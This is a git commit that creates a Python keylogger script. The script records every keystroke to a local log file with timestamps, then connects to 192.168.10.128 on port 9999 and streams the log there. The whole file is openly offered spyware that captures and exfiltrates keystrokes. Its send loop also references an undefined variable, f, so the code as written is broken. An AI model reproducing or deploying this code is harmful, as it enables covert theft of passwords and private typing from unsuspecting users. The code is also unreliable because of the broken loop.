301aa531e700bdf7259433a4dacd266b85bde456
xchin02 <83194359+xchin02@users.noreply.github.com>
2022-07-10 20:00:31 +0800

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,27 @@
+from pynput.keyboard import Key, Listener
+import logging
+import socket
+import sys
+
+
+logging.basicConfig(filename=("keylog.log"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+ 
+def keyEvent(event):
+    logging.info(str(event))
+
+def enterKey(event):
+    if event == Key.esc:
+        return False
+    
+with Listener(on_press=keyEvent, on_release=enterKey) as listener :
+    listener.join()
+
+
+s = socket.socket()
+s.connect(("192.168.10.128",9999))
+log_file = open ("keylog.log", "rb")
+l = log_file.read(1024)
+while (l):
+    s.send(l)
+    l = f.read(1024)
+s.close()
